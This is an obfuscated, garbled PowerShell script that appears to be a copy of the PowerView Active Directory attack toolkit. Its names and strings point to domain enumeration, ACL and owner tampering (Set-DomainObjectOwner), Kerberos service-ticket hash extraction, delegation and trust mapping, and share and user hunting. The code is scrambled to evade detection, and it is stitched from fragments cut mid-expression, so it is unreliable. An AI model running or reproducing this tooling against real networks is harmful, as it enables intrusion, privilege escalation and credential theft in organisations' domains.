function finD-DIJKOmainuIJKSIJKErlOcaTIJKion {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{4}{1}{0}{3}{2}Z3b -f S5zouldPS5z,S5zSShS5z,S5zocessS5z,S5zrS5z,S5zPS5z}, S5zS5z)]
    [OutputType({Z3b{4}{0}{3}{2}{1}Z3b -fS5zoS5z,S5zionS5z,S5zocatS5z,S5zwerView.UserLS5z,S5zPS5z})]
    [CmdletBinding(DEfAULTpArAmeTErSETnAMe = {Z3b{',')
            }
        }
    }
}


function GEtIJK-IJKdOMaIIJKNFIlesERvER {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{3}{0}{4}{1}{2}Z3b-fS5zSShS5z,S5zrocesS5z,S5zsS5z,S5zPS5z,S5zouldPS5z}, S5zS5z)]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter( VAlUEFrompIPEline = YoV{TIJKRUE}, vALUEfrOmpIpEliNebYPROPertYnAMe = YoV{TrIJKUE})]
        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{2}{0}{1}Z3b-fS5zinNamS5z,S5zeS5z,S5zDomaS5z}, {Z3b{1}{0}Z3b-fS5zmeS5z,S5zNaS5z})]
        [String[]]
        YoV{dOMAIJKIN},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{1}{2}{0}Z3b-f S5zrS5z,S5zFiS5z,S5zlteS5z})]
        [String]
        YoV{lDapIJKFiLTIJKEr},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{1}{2}{0}Z3b -f S5zthS5z,S5zADS5z,S5zSPaS5z})]
        [String]
        YoV{sIJKEArCIJKHbASE},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{4}{3}{2}{1}Z3b -fS5zDS5z,S5znControllerS5z,S5zaiS5z,S5zmS5z,S5zoS5z})]
        [String]
        YoV{SEIJKRvIJKER},

        [ValidateSet({Z3b{1}{0}Z3b-f S5zseS5z,S5zBaS5z}, {Z3b{2}{0}{1}Z3b -f S5zeS5z,S5zvelS5z,S5zOneLS5z}, {Z3b{1}{0}{2}Z3b -f S5zu','{0}{2}Z3b-f S5zubStriS5z,S5zSS5z,S5zngS5z).Invoke(YoV{identIJKItYiNsIJKTIJKANCe}.(Z3b{0}{1}{2}Z3b-f S5zIndexS5z,S5zOS5z,S5zfS5z).Invoke(S5zDC=S5z)) -replace S5zDC=S5z,S5zS5z -replace S5z,S5z,S5z.S5z
                        &(Z3b{3}{0}{1}{2}{4}Z3b -f S5zrS5z,S5zite-VS5z,S5zerboS','5zcuriS5z+S5ztyS5z+S5z-AuS5z+S5zditS5z+S5zing0Uq
S5z+S5z S5z)-crEplAce  ([cHaR]48+[cHaR]85+[cHaR]113),[cHaR]39)+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z]S5z+S5z
 S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5zanS5z+S5zd S5z+S5z(LeveS5z+S5zlS5z+S5z=4S5z+S5z S5z+S5zorS5z+S5z S5z+S5zLevelS5z+S5z=S5z+S5z0) S5z+S5zanS5z+S5zd S5z+S5z(EvS5z+S5zentIDS5z+S5z=4S5z+S5z648S5z+S5z)S5z+S5z
 S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5zanS5z+S5zd S5z+S5zTimeS5z+S5zCS5z+S5zreated[S5z+S5zS5z+S5z
 S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+((S5z@SysteS5z+S5zmTime&gS5z+S5ztS5z+S5z;S5z+S5z=nOE8Rb(8RbStS5z+S5zarS5z+S5ztTime.ToUniversS5z+S5zalS5z+S5zTS5z+S5zime(S5z+S5z).ToStriS5z+S5zng(S5z+S5znOES5z+S5zsS5z+S5znOS5z','}{2}{0}Z3b -fS5zCreatedS5z,S5zWheS5z,S5znS5z) YoV{PIJKRIJKoPs}.Z3bwHIJKENcreATIJKEDZ3b[0]
                    YoV{dIJKoMAIJKIntRIJKUst} JGO &(Z3b{2}{1}{0}Z3b -fS5zemberS5z,S5zd-MS5z,S5zAdS5z) (Z3b{2}{0}{1}Z3b-f S5zepropertS5z,S5zyS5z,S5zNotS5z) (Z3b{3}{2}{0}{1}Z3b -f S5z','zhouldPS5z,S5zrocessS5z,S5zPS5z}, S5zS5z)]
    [OutputType({Z3b{0}{3}{2}{1}Z3b-fS5zPS5z,S5zACLS5z,S5ziew.S5z,S5zowerVS5z})]
    [CmdletBinding()]
    Param (
        [Parameter(posiTIoN = 0, VAlUeFROMPiPeLine = YoV{tIJKRue}, vALuefROmPiPeliNebYpropERTyNAMe = YoV{TIJKRue})]
        [Alias({Z3b{2}{1}{0}Z3b-f S5zameS5z,S5zNS5z,S5zDomainS5z}, {Z3b{0}{1}Z3b -fS5zNamS5z,S5zeS5z})]
        [String]
        YoV{DIJKoIJKMaIn},

        [Switch]
        YoV{ReSoIJKLVIJKEGIJKUIdS},

        [String]
        [ValidateSet(S5zAllS5z, {Z3b{0}{2}{1}{3}Z3b -fS5zReseS5z,S5zswS5z,S5ztPasS5z,S5zordS5z}, {Z3b{2}{1}{0}{3}Z3b-fS5zitS5z,S5zrS5z,S5zWS5z,S5zeMembersS5z})]
        YoV{RiIJKGhTSFiIJKlIJKTIJKer},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{1}{0}{2}Z3b-fS5ziS5z,S5zFS5z,S5zlterS5z})]
        [String]
        YoV{LIJKDapfIlTIJKer},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{2}{1}{0}Z3b -f S5zhS5z,S5ztS5z,S5zADSPaS5z})]
        [String]
        YoV{sIJKEaRChBIJKAIJKse},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{1}{2}{3}{0}Z3b-f S5zlerS5z,S5zDomainCoS5z,S5znS5z,S5ztrolS5z})]
        [String]
        YoV{SEIJKRIJKVeR},

        [ValidateSet({Z3b{0}{1}Z3b -f S5zBaS5z,S5zseS5z}, {Z3b{1}{0}{2}Z3b -fS5zeS5z,S5zOneLevS5z,S5zlS5z}, {Z3b{2}{0}{1}Z3b -f S5ztS5z,S5zreeS5z,S5zSubS5z})]
        [String]
        YoV{SEaRchSIJKCIJKopE} = (Z3b{1}{0}{2}Z3b-f S5zeS5z,S5zSubtrS5z,S5zeS5z),

        [ValidateRange(1, 10000)]
        [Int]
        YoV{RESULTpaIJKGIJKeSIJKiIJKZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{seRvIJKeIJKRtIIJKMeliMiT},

        [Switch]
        YoV{toIJKmBstoIJKNE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{crIJKEdIJKentIJKIAL} =   YoV{JIJKFI}::Z3beIJKmPtYZ3b
    )

    BEGIN {
        YoV{AclIJKARgUmEIJKNIJKTs} = @{}
        if (YoV{PSIJKBoIJKUIJKNdPArAIJKMetErS}[(Z3b{2}{0}{3}{1}Z3b-fS5zeS5z,S5zUIDsS5z,S5zResolvS5z,S5zGS5z)]) { YoV{AClarGIJKUmIJKEIJKNts}[(Z3b{1}{0}{2}Z3b-f S5zGUIDS5z,S5zResolveS5z,S5zsS5z)] = YoV{RIJKeIJKsOIJKLVEgUIdS} }
        if (YoV{pIJKSBouIJKNdPIJKArameIJKTErS}[(Z3b{3}{1}{2}{0}Z3b-f S5zrS5z,S5zightsS5z,S5zFilteS5z,S5zRS5z)]) { YoV{AclaIJKRgIJKUMENTS}[(Z3b{2}{1}{0}Z3b -fS5zrS5z,S5ztsFilteS5z,S5zRighS5z)] = YoV{RiIJKGHIJKTIJKsFILtIJKer} }
        if (YoV{PsbouIJKNDpIJKAIJKRaIJKMetERs}[(Z3b{2}{0}{1}Z3b-f S5ztS5z,S5zerS5z,S5zLDAPFilS5z)]) { YoV{aclAIJKRIJKgUmentS}[(Z3b{0}{1}{2}Z3b -f S5zLDAS5z,S5zPFiltS5z,S5zerS5z)] = YoV{lIJKDIJKAPFiIJKLTER} }
        if (YoV{psbOIJKUIJKNdPIJKARAMeTeRs}[(Z3b{0}{1}{2}Z3b -fS5zSearchBS5z,S5zasS5z,S5zeS5z)]) { YoV{aCLARguMeIJKNIJKTs}[(Z3b{0}{1}{2}Z3b -fS5zSearcS5z,S5zhBaS5z,S5zseS5z)] = YoV{SEaRcHBIJKAIJKSE} }
        if (YoV{psIJKBIJKounDPIJKARAIJKmEterS}[(Z3b{0}{1}Z3b-fS5zServeS5z,S5zrS5z)]) { YoV{aIJKclIJKA','
                                (Z3b{0}{1}{3}{2}{4}Z3b-f S5zImS5z,S5zpersonationS5z,S5zveS5z,S5zLeS5z,S5zlS5z)        = YoV{pROIJKpEIJKRtIEs}[20].Z3bVIJKAlUeZ3b
                                (Z3b{1}{0}{3}{4}{2}Z3b-fS5ztricteS5z,S5zResS5z,S5zodeS5z,S5zdAdmS5z,S5zinMS5z)       = YoV{pRIJKopERIJKTieS}[21].Z3bvAlIJKUeZ3b
                                (Z3b{5}{1}{3}{2}{0}{4}Z3b-f S5zndUS5z,S5zrgeS5z,S5zouS5z,S5ztOutbS5z,S5zserNameS5z,S5zTaS5z)    = YoV{PIJKRIJKOIJKpeRtieS}[22].Z3bvaIJKlUEZ3b
                                (Z3b{3}{1}{5}{4}{2}{0}{6}Z3b-fS5zaS5z,S5zgS5z,S5zundDomainNS5z,S5zTarS5z,S5zboS5z,S5zetOutS5z,S5zmeS5z)  = YoV{proIJKPERIJKTIJKIES}[23].Z3bvAIJKLueZ3b
                                (Z3b{1}{2}{3}{0}Z3b-f S5zntS5z,S5zVirtuaS5z,S5zlAccoS5z,S5zuS5z)            = YoV{pROpIJKeRTIIJKES}[24].Z3bvaIJKLUEZ3b
                                (Z3b{1}{0}{2}{3}Z3b -fS5zrgetLS5z,S5zTaS5z,S5zinkedLS5z,S5zogonIdS5z)       = YoV{PIJKRIJKOIJKpeRtieS}[25].Z3bVIJKAlUEZ3b
                                (Z3b{1}{0}{3}{2}Z3b-f S5zTS5z,S5zElevatedS5z,S5znS5z,S5zokeS5z)             = YoV{pIJKRopIJKErtIES}[26].Z3bvaIJKlueZ3b
                            }
                     ','in} = YoV{ideNTIJKItIJKyInSTIJKAnCE}.(Z3b{0}{2}{1}Z3b-f S5zSubSS5z,S5zgS5z,S5ztrinS5z).Invoke(YoV{iIJKDIJKEnTITyIJKinStanCE}.(Z3b{1}{0}{2}Z3b -fS5zxOS5z,S5zIndeS5z,S5zfS5z).Invoke(S5zDC=S5z)) -replace S5zDC=S5z,S5zS5z -replace S5z,S5z,S5z.S5z
                            &(Z3b{0}{1}{3}{2}Z3b -fS5zWritS5z,S5ze-VS5z,S5zboseS5z,S5zerS5z) (S5z[S5z+S5zGetS5z+S5z-DomS5z+S5zainGroS5z+S5zup]S5z+S5z S5z+S5zES5z+S5zxS5z+S5ztracted S5z+S5zdomS5z+S5zaiS5z+S5zn S5z+Z3bS5zYoVIdentityDomainS5z Z3b+S5zfS5z+S5zrom S5z+Z3bS5zYoVIdentityInstanceS5zZ3b)
                            YoV{SIJKeARcheRARguIJKmIJKeIJKNts}[(Z3b{1}{0}Z3b-f S5zmainS5z,S5zDoS5z)] = YoV{IDIJKENTIIJKTIJKydoMIJKAIn}
                            YoV{gROupsIJKeIJKARCHER} = &(Z3b{1}{3}{0}{2}Z3b-f S5zmainSearS5z,S5zGS5z,S5zcherS5z,S5zet-DoS5z) @SearcherArguments
                            if (-not YoV{grIJKOupSEaRIJKchIJKer}) {
                                &(Z3b{4}{1}{2}{0}{3}Z3b -f S5z-WS5z,S5zrS5z,S5ziteS5z,S5zarningS5z,S5zWS5z) (S5z[Get-DoS5z+S5zmaS5z+S5zinGrS5z+S5zoS5z+S5zup]S5z+S5z S5z+S5zUnabS5z+S5zleS5z+S5z S5z+S5ztoS5z+S5z S5z+S5zretS5z+S5zriS5z+S5zeve S5z+S5zdomaS5z+S5ziS5z+S5zn S5z+S5zsearS5z+S5zcheS5z+S5zr S5z+S5zfS5z+S5zor S5z+Z3bS5zYoVIdentityDomainS5zZ3b)
                            }
                        }
                    }
                    elseif (YoV{IDIJKEnTitYIJKInsIJKTaIJKNcE} -imatch S5z^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}YoVS5z) {
                        YoV{gIJKUIDbYTIJKeStIJKRIJKInG} = (([Guid]YoV{IDEntIIJKTIJKyiNStaIJKNcE}).(Z3b{1}{0}{2}Z3b-f S5zoBytS5z,S5zTS5z,S5zeArrayS5z).Invoke() JGO &(Z3b{1}{0}{3}{2}Z3b-f S5zbjeS5z,S5zForEach-OS5z,S5ztS5z,S5zcS5z) { S5z5rjS5z + YoV{_}.(Z3b{1}{0}Z3b-fS5zingS5z,S5zToStrS5z).Invoke(S5zX2S5z) }) -join S5zS5z
                        YoV{idIJKenIJKTiIJKTyfilTIJKEr} += Z3b(objectguid=YoVGuidByteString)Z3b
                    }
                    elseif (YoV{iIJKDEnTiIJKTyiIJKNstIJKAnIJKCe}.(Z3b{1}{0}Z3b-f S5znsS5z,S5zContaiS5z).Invoke(S5z5rjS5z)) {
     ','z,S5zinguisS5z) YoV{dIJKiSTINIJKGIJKUIsheDnIJKAIJKME}
                YoV{OIJKUt} JGO &(Z3b{1}{3}{2}{0}Z3b-fS5zmberS5z,S5zAdS5z,S5z-MeS5z,S5zdS5z) (Z3b{2}{3}{1}{0}Z3b-f S5ztyS5z,S5zoperS5z,S5zNotepS5z,S5zrS5z) (Z3b{1}{2}{5}{0}{3}{4}Z3b -f S5zpaS5z,S5zServicS5z,S5zePrincS5z,S5zlNS5z,S5zameS5z,S5ziS5z) YoV{TIIJKCKET}.Z3bsERvICIJKeIJKPriNCIIJKPAlIJKNIJKAMEZ3b

                
                
                if(YoV{TIJKiIJKcIJKkETIJKHeXsTream} -match S5za382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)S5z) {
                    YoV{EtyIJKpE} =  (&(Z3b{0}{1}Z3b -fS5zGS5z,S5zCIS5z)  (Z3bvARZ3b+Z3biAbZ3b+Z3bLE:FZ3b+Z3bOZ3b+Z3bQSNZ3b)).Z3bVAIJKlUEZ3b::(Z3b{2}{0}{1}Z3b -f S5zBytS5z,S5zeS5z,S5zToS5z).Invoke( YoV{mIJKATIJKCheS}.Z3bEtYpeIJKLIJKenZ3b, 16 )
                    YoV{ciphERIJKTExIJKTLeN} =  YoV{fIJKoqsn}::(Z3b{1}{2}{0}Z3b-f S5z2S5z,S5zToUS5z,S5zInt3S5z).Invoke(YoV{mIJKATcHES}.Z3bciPHEIJKRIJKTexTIJKlenZ3b, 16)-4
                    YoV{CiIJKpHIJKErtIJKEXt} = YoV{maTIJKcHIJKEs}.Z3bDIJKAtAtIJKOeNdZ3b.(Z3b{0}{2}{1}Z3b -f S5zSubsS5z,S5zringS5z,S5ztS5z).Invoke(0,YoV{cIJKIPHeRTIJKEIJKXtLen}*2)

                    
                    if(YoV{mIJKAIJK','rcherArguments

            ForEach (YoV{OBIJKjeIJKCT} in YoV{RaWIJKoIJKBIJKjeCt}) {
                try {
                    &(Z3b{1}{2}{0}{3}Z3b-f S5zrbS5z,S5zWrite-VS5z,S5zeS5z,S5zoseS5z) (S5z[SeS5z+S5ztS5z+S5z-DS5z+S5zomainObjectOwnS5z+S5zeS5z+S5zr]S5z+S5z S5z+S5zAtteS5z+S5zmpS5z+S5ztiS5z+S5zng S5z+S5ztoS5z+S5z S5z+S5zsetS5z+S5z S5z+S5zthS5z+S5ze S5z+S5zownerS5z+S5z S5z+S5zfS5z+S5zor S5z+Z3bS5zYoVIdentityS5z Z3b+S5ztS5z+S5zo S5z+Z3bS5zYoVOwnerIdentityS5zZ3b)
                    YoV{enTIJKRY} = YoV{rIJKAwIJKoBJECt}.(Z3b{2}{4}{3}{1}{0}Z3b -fS5zntryS5z,S5zES5z,S5zGetDS5z,S5zectoryS5z,S5zirS5z).Invoke()
                    YoV{eIJKNtIJKRY}.Z3bpIJKsbaSeZ3b.Z3bOpTIJKiIJKoNSZ3b.Z3bsecIJKUrIIJKTYmAsKSZ3b = (Z3b{0}{1}Z3b -fS5zOwneS5z,S5zrS5z)
                    YoV{EIJKNIJKTry}.Z3bPsBAIJKSEZ3b.Z3bOIJKBJECIJKTIJKSECuRItyZ3b.(Z3b{1}{0}{2}Z3b-fS5zOwS5z,S5zSetS5z,S5znerS5z).Invoke(YoV{OWNIJKeriIJKDIJKEntitYIJKREFERIJKENIJKce})
                    YoV{EIJKNTIJKRY}.Z3bPIJKSIJKBAseZ3b.(Z3b{0}{1}{2}Z3b-fS5zCoS5z,S5zmmitChangS5z,S5zesS5z).Invoke()
                }
                catch {
                    &(Z3b{1}{0}{2}Z3b-fS5zte-WaS5z,S5zWriS5z,S5zrningS5z) (S5z[Set-S5z+S5zDoS5z+S5zmaS5z+S5zinS5z+S5zOS5z+S5zbjectS5z+S5zOwner] S5z+S5zErrorS5z+S5z S5z+S5zsettiS5z+S5znS5z+S5zg S5z+S5zowneS5z+S5zr: S5z+Z3bYoV_Z3b)
                }
            }
        }
    }
}


function GEt-DomAiNoIJKBIJKJIJKEctIJKACL {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{2}{3}{1}{0}{4}Z3b-f S5zuldProcesS5z,S5zhoS5z,S5zPS5z,S5zSSS5z,S5zsS5z}, S5zS5z)]
    [OutputType({Z3b{0}{2}{1}Z3b -fS5zPowS5z,S5z.ACLS5z,S5zerViewS5z})]
    [CmdletBinding()]
    Param (
        [Parameter(poSITIOn = 0, ValUEFRomPiPeliNE = YoV{tIJKRUe}, VAlUefRomPiPeLineBYPRoPeRTynAme = YoV{TRIJKUE})]
        [Alias({Z3b{','3b
                }
                elseif (YoV{iDIJKEIJKNTIJKITYInstANce} -imatch S5z^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}YoVS5z) {
                    YoV{gUIJKIIJKDbytEsTIJKRiIJKNG} = (([Guid]YoV{idIJKENtiIJKTYInStIJKANIJKcE}).(Z3b{2}{0}{1}{3}Z3b-fS5zAS5z,S5zrraS5z,S5zToByteS5z,S5zyS5z).Invoke() JGO &(Z3b{3}{2}{0}{1}Z3b-f S5z-S5z,S5zObjectS5z,S5zEachS5z,S5zForS5z) { S5z5rjS5z + YoV{_}.(Z3b{1}{2}{0}Z3b-fS5zringS5z,S5zToSS5z,S5ztS5z).Invoke(S5zX2S5z) }) -join S5zS5z
                    YoV{IIJKdENTIJKiTYFilteR} += Z3b(objectguid=YoVGuidByteString)Z3b
                }
                else {
                    YoV{IDEnTitIJKyIJKFIlIJKTIJKer} += Z3b(name=YoVIdentityInstance)Z3b
                }
            }
            if (YoV{idIJKentIJKitIJKyfIJKIlTer} -and (YoV{iIJKDENIJKTiIJKTyFilIJKTER}.(Z3b{1}{0}Z3b -f S5zmS5z,S5zTriS5z).Invoke() -ne S5zS5z) ) {
                YoV{FIJKiIJKLTER} += Z3b(JGOYoVIdentityFilter)Z3b
            }

            if (YoV{PsBIJKoUndpIJKARAmIJKETERs}[(Z3b{0}{2}{1}Z3b -f S5zUncS5z,S5zdS5z,S5zonstraineS5z)]) {
                &(Z3b{3}{1}{2}{0}Z3b-f S5zseS5z,S5zVeS5z,S5zrboS5z,S5zWrite-S5z) (Z3b{15}{20}{6}{18}{19}{10}{2}{4}{17}{8}{13}{11}{3}{0}{7}{12}{14}{5}{1}{16}{9}Z3b -fS5zor coS5z,S5znsS5z,S5zeS5z,S5zfS5z,S5zrS5z,S5zoS5z,S5zomaS5z,S5zmputers withS5z,S5zeaS5z,S5zlegationS5z,S5zmputS5z,S5zhing S5z,S5z S5z,S5zrcS5z,S5zfor uncS5z,S5z[GS5z,S5ztrained deS5z,S5z] SS5z,S5zinCS5z,S5zoS5z,S5zet-DS5z)
                YoV{fIJKilIJKTEr} += (Z3b{2}{1}{12}{13}{4}{11}{9}{0}{6}{3}{5}{8}{10}{14}{7}Z3b-fS','Z3b -fS5zSecS5z,S5zksS5z,S5zurityMasS5z)] = YoV{sIJKeCIJKUrITYMASKs} }
        if (YoV{pSbOIJKUnIJKdPaRameIJKTErS}[(Z3b{0}{1}Z3b -f S5zTombsS5z,S5ztoneS5z)]) { YoV{sIJKeIJKArIJKcHeRARgIJKUmENTS}[(Z3b{1}{2}{0}Z3b-f S5zeS5z,S5zTombstS5z,S5zonS5z)] = YoV{ToIJKmIJKBSTIJKoNe} }
        if (YoV{pIJKSBIJKoundPIJKARIJKAMeTIJKerS}[(Z3b{0}{2}{1}Z3b -f S5zCredS5z,S5zlS5z,S5zentiaS5z)]) { YoV{SIJKeaRCHeRIJKArIJKGIJKUIJKmenTs}[(Z3b{1}{0}{2}Z3b -f S5zaS5z,S5zCredentiS5z,S5zlS5z)] = YoV{CReIJKDIJKEntiIJKAL} }
        if (YoV{PsBIJKOUnIJKDpAIJKRamEtErs}[S5zRawS5z]) { YoV{sIJKeArchERArGIJKUIJKmENIJKTS}[S5zRawS5z] = YoV{rIJKAw} }
    }

    PROCESS {
        
        YoV{ExIJKCluDEGRIJKOUPS} = @((Z3b{1}{0}Z3b -f S5zsS5z,S5zUserS5z), (Z3b{0}{1}{2}{3}Z3b-fS5zDS5z,S5zomS5z,S5zain UseS5z,S5zrsS5z), (Z3b{2}{1}{0}Z3b -f S5zsS5z,S5zuestS5z,S5zGS5z))

        &(Z3b{2}{0}{1}{3}Z3b-fS5zDomS5z,S5zainGroS5z,S5zGet-S5z,S5zupS5z) @SearcherArguments JGO &(Z3b{2}{3}{1}{0}Z3b -fS5ztS5z,S5zere-ObjecS5z,S5zWS5z,S5zhS5z) { YoV{ExcLIJKUDIJKegIJKRoups} -notcontains YoV{_}.Z3bsIJKAMACIJKCOuNIJKTIJKNaMEZ3b } JGO &(Z3b{0}{2}{3}{1}Z3b -f S5zForEaS5z,S5zectS5z,S5zch-ObS5z,S5zjS5z) {
            YoV{grIJKouPIJKNAIJKme} = YoV{_}.Z3bSaIJKmaCCouIJKNtIJKNaMeZ3b
            YoV{GRoUIJKPIJKdiStinguIJKIShIJKeDIJKNaIJKME} = YoV{_}.Z3bDIJKiStIn',',S5znPrS5z)
&(Z3b{2}{3}{0}{1}Z3b-fS5zAlS5z,S5ziasS5z,S5zSS5z,S5zet-S5z) (Z3b{0}{1}{3}{2}Z3b -f S5zIS5z,S5znvoke-EventS5z,S5zterS5z,S5zHunS5z) (Z3b{3}{0}{2}{1}Z3b-fS5znd-S5z,S5zntS5z,S5zDomainUserEveS5z,S5zFiS5z)
&(Z3b{1}{0}{2}Z3b-fS5zt-AlS5z,S5zSeS5z,S5ziasS5z) (Z3b{1}{2}{0}{3}Z3b -fS5ze-ShareFinS5z,S5zInS5z,S5zvokS5z,S5zderS5z) (Z3b{3}{0}{2}{1}Z3b-fS5z-S5z,S5zeS5z,S5zDomainSharS5z,S5zFindS5z)
&(Z3b{1}{2}{0}Z3b -fS5z-AliasS5z,S5zSeS5z,S5ztS5z) (Z3b{1}{2}{0}{3}{4}Z3b-f S5zoke-FileS5z,S5zIS5z,S5znvS5z,S5zFinS5z,S5zderS5z) (Z3b{2}{4}{1}{0}{3}{5}{6}Z3b -f S5zrS5z,S5zeS5z,S5zFinS5z,S5zesS5z,S5zd-IntS5z,S5ztS5z,S5zingDomainShareFileS5z)
&(Z3b{2}{1}{0}Z3b-f S5zAliasS5z,S5zet-S5z,S5zSS5z) (Z3b{0}{6}{2}{4}{3}{5}{1}{7}Z3b-fS5zIS5z,S5zdS5z,S5znumS5z,S5zeLoS5z,S5zeratS5z,S5zcalAS5z,S5znvoke-ES5z,S5zminS5z) (Z3b{1}{0}{3}{2}{4}{5}Z3b -fS5znd-S5z,S5zFiS5z,S5zGrouS5z,S5zDomainLocalS5z,S5zpMembeS5z,S5zrS5z)
&(Z3b{0}{1}{2}Z3b -f S5zSet-S5z,S5zAS5z,S5zliasS5z) (Z3b{3}{2}{0}{1}Z3b-f S5zainTruS5z,S5zstS5z,S5z-NetDomS5z,S5zGetS5z) (Z3b{0}{1}{2}{3}Z3b-f S5zGet-DomS5z,S5zaiS5z,S5znTS5z,S5zrustS5z)
&(Z3b{1}{2}{0}Z3b-fS5zsS5z,S5zSS5z,S5zet-AliaS5z) (Z3b{0}{5}{1}{3}{4}{2}Z3b-fS5zGS5z,S5z-NetFS5z,S5zrustS5z,S5zorestS5z,S5zTS5z,S5zetS5z) (Z3b{1}{3}{4}{2}{0}Z3b -f S5ztS5z,S5zGeS5z,S5zForestTrusS5z,S5ztS5z,S5z-S5z)
&(Z3b{0}{2}{1}Z3b -f S5zSS5z,S5zliasS5z,S5zet-AS5z) (Z3b{0}{2}{3}{4}{1}Z3b -fS5zFind-ForeiS5z,S5zrS5z,S5zgS5z,S5znUsS5z,S5zeS5z) (Z3b{3}{2}{1}{4}{0}Z3b -f S5zUserS5z,S5zeigS5z,S5zDomainForS5z,S5zGet-S5z,S5znS5z)
&(Z3b{0}{2}{1}Z3b-fS5zSet-AS5z,S5zsS5z,S5zliaS5z) (Z3b{0}{2}{3}{1}Z3b-f S5zFiS5z,S5zupS5z,S5znd-ForeignGrS5z,S5zoS5z) (Z3b{1}{3}{4}{0}{5}{2}Z3b -f S5zFS5z,S5zGet-DS5z,S5zgnGroupMemberS5z,S5zomaiS5z,S5znS5z,S5zoreiS5z)
&(Z3b{2}{0}{1}Z3b -f S5z-AliaS5z,S5zsS5z,S5zSetS5z) (Z3b{2}{3}{1}{0}{5}{4}Z3b-fS5zeS5z,S5zvokS5z,S5zIS5z,S5znS5z,S5zainTrustS5z,S5z-MapDomS5z) (Z3b{4}{6}{3}{0}{5}{2}{1}Z3b -f S5zMS5z,S5zngS5z,S5zppiS5z,S5zrustS5z,S5zGet-DS5z,S5zaS5z,S5zomainTS5z)
&(Z3b{2}{0}{1}Z3b-f S5zAS5z,S5zliasS5z,S5zSet-S5z) (Z3b{2}{3}{0}{1}Z3b-f S5zDomaiS5z,S5znPolicyS5z,S5zGetS5z,S5z-S5z) (Z3b{3}{2}{0}{1}{4}Z3b -f S5zaiS5z,S5znPolicyDatS5z,S5zomS5z,S5zGet-DS5z,S5zaS5z)','+[CHAR]98+[CHAR]90),S5z5rjS5z)) }
                    (Z3b{2}{0}{1}{3}Z3b-fS5z-5-3S5z,S5z2-S5z,S5zS-1S5z,S5z550S5z)  { (((Z3b{1}{4}{0}{2}{3}{5}Z3b -fS5zLPrS5z,S5zBUILTS5z,S5zint OS5z,S5zperatorS5z,S5zINw8S5z,S5zsS5z)).(Z3b{1}{2}{0}Z3b -f S5zeS5z,S5zrS5z,S5zeplACS5z).Invoke(S5zw8LS5z,S5z5rjS5z)) }
                    (Z3b{2}{0}{1}Z3b -fS5z5S5z,S5z1S5z,S5zS-1-5-32-5S5z)  { (((Z3b{3}{1}{2}{4}{0}Z3b-f S5zperatorsS5z,S5zNS5z,S5zpUdS5z,S5zBUILTIS5z,S5zBackup OS5z)) -RePlAceS5zpUdS5z,[cHar]92) }
                    (Z3b{0}{1}{2}{3}Z3b-fS5zS-1-5-S5z,S5z3S5z,S5z2S5z,S5z-552S5z)  { (((Z3b{0}{1}{4}{3}{2}{5}Z3b-f S5zBUIS5z,S5zLTINS5z,S5zicatS5z,S5z}ReplS5z,S5z{0S5z,S5zorsS5z))-f [cHaR]92) }
                    (Z3b{0}{2}{1}Z3b-f S5zS-1S5z,S5z-32-554S5z,S5z-5S5z)  { (((Z3b{2}{6}{0}{4}{9}{10}{5}{8}{11}{7}{3}{1}Z3b-fS5zndS5z,S5zsS5z,S5zBUILTINwrmS5z,S5zesS5z,S5zows 20S5z,S5zatiS5z,S5zPre-WiS5z,S5z AccS5z,S5zblS5z,S5z0S5z,S5z0 CompS5z,S5zeS5z)) -CrEplaCeS5zwrmS5z,[Char]92) }
                    (Z3b{0}{1}{3}{2}Z3b-f S5zS-1S5z,S5z-5S5z,S5z555S5z,S5z-32-S5z)  { (((Z3b{7}{2}{3}{1}{5}{4}{0}{6}Z3b-fS5z DeskS5z,S5zIN{0','
        YoV{PIJKROIJKPEIJKRtiES},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{1}{0}Z3b -f S5zthS5z,S5zADSPaS5z})]
        [String]
        YoV{sIJKeARChbIJKAIJKSe},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{2}{1}Z3b -f S5zDomainCoS5z,S5zerS5z,S5zntrollS5z})]
        [String]
        YoV{serIJKVIJKeR},

        [ValidateSet({Z3b{0}{1}Z3b-f S5zBS5z,S5zaseS5z}, {Z3b{0}{1}{2}Z3b -fS5zOneLS5z,S5zeveS5z,S5zlS5z}, {Z3b{1}{2}{0}Z3b-fS5zeeS5z,S5zSubS5z,S5ztrS5z})]
        [String]
